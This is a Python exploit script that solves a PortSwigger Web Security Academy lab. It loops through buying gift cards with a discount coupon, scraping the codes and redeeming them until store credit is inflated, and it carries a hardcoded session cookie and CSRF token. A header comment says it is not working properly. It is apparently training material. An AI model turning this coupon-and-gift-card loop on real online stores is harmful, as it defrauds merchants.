# Not currently working properly.

import requests
from bs4 import BeautifulSoup

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

host = "0a9100be031d53bb8138b1be00ad00f5.web-security-academy.net"

cookies = {
        "session": "orH1TblH9zaTmyQbMrsNGOltzjwXymJF",
}

proxies = {
    "https": "http://localhost:8080",
}

csrf_token = "2A5iUItakOusVxAfst6JYiS6s7jHOhZq"


def add_to_cart(product_id):
    endpoint = "cart"
    url = f"https://{host}/{endpoint}"

    data = {
        "productId": product_id,
        "redir": "PRODUCT",
        "quantity": 10,
    }    
    
    requests.post(
        url, cookies=cookies, data=data, proxies=proxies, verify=False
    )


def apply_coupon():
    endpoint = "cart/coupon"
    url = f"https://{host}/{endpoint}"

    data = {
        "csrf": csrf_token,
        "coupon": "SIGNUP30",
    }

    requests.post(
        url, cookies=cookies, data=data, proxies=proxies, verify=False
    )


def checkout():
    endpoint = "cart/checkout"
    url = f"https://{host}/{endpoint}"

    data = {
        "csrf": csrf_token,
    }

    gift_cards_html = requests.post(
        url, cookies=cookies, data=data, proxies=proxies, verify=False
    ).text

    return gift_cards_html


def get_gift_cards(gift_cards_html):
    gift_cards = []

    soup = BeautifulSoup(gift_cards_html,"html.parser")
    
    for tag in soup.find_all("td"):
        if len(tag.text) == 10:
            gift_card = tag.text
            gift_cards.append(gift_card)

    return gift_cards


def redeem_gift_cards(gift_cards):
    endpoint = "gift-card"
    url = f"https://{host}/{endpoint}"

    for gift_card in gift_cards:
        data = {
        "csrf": csrf_token,
        "gift-card": gift_card,
        }

        requests.post(
            url, cookies=cookies, data=data, proxies=proxies, verify=False
        )        


def main():
    BANNER = "Portswigger Infinite Money Logic Flaw Lab"

    print(BANNER)

    print()

    endpoint = "cart"
    url = f"https://{host}/{endpoint}"
    gift_card_id = 2

    store_credit = float(requests.get(
        url, cookies=cookies, proxies=proxies, verify=False
    ).text.split("Store credit: $")[1].split("<")[0])

    while store_credit < 1337.00:
        add_to_cart(gift_card_id)

        apply_coupon()

        gift_cards_html = checkout()

        gift_cards = get_gift_cards(gift_cards_html)

        redeem_gift_cards(gift_cards)

        store_credit = float(requests.get(
            url, cookies=cookies, proxies=proxies, verify=False
        ).text.split("Store credit: $")[1].split("<")[0])

    print("[DEBUG] Sufficient store credit to buy l33t leather jacket ...")

    print()

    choice = input("Buy jacket: (y/n)? ")

    print()

    if choice.lower() == "y":
        leather_jacket_id = 1

        add_to_cart(leather_jacket_id)

        if "Your order is on its way!" in checkout():
            print("Lab solved!")
        else:
            print("Failed to buy jacket")


if __name__ == "__main__":
   main()